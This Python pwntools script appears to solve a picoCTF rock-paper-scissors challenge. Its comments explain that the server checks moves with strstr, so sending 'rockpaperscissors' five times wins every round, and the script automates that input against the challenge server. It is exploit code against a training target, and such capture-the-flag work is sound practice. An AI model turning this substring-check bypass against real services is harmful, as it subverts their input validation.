#!/usr/bin/python3
from pwn import *
import time

def start():
    return remote("saturn.picoctf.net", 58890)

io = start()

# JUST USE NETCAT
# payloads
# computer plays 0: rock 1: paper 2: scissors
# we need to play 0: paper 1: scissors 2: rock
# computer uses strstr to check whether loses[computer_turn] is in the string
# provided by the user for example 'rock'. Thats why we have to input the string
# 'rockpaperscissors' 5 times to win

p1 = b"rockpaperscissors"
p2 = b"rockpaperscissors"
p3 = b"rockpaperscissors"
p4 = b"rockpaperscissors"
p5 = b"rockpaperscissors"

log.info("1")
io.recvuntil(b"Type '2' to exit the program")
io.sendline(b"1")
io.sendlineafter(b"Please make your selection (rock/paper/scissors):", p1)

log.info("2")
io.recvuntil(b"Type '2' to exit the program")
io.sendline(b"1")
io.sendlineafter(b"Please make your selection (rock/paper/scissors):", p2)

log.info("3")
io.recvuntil(b"Type '2' to exit the program")
io.sendline(b"1")
io.sendlineafter(b"Please make your selection (rock/paper/scissors):", p3)

log.info("4")
io.recvuntil(b"Type '2' to exit the program")
io.sendline(b"1")
io.sendlineafter(b"Please make your selection (rock/paper/scissors):", p4)

log.info("5")
io.recvuntil(b"Type '2' to exit the program")
io.sendline(b"1")
io.sendlineafter(b"Please make your selection (rock/paper/scissors):", p5)


io.recv()
io.interactive()
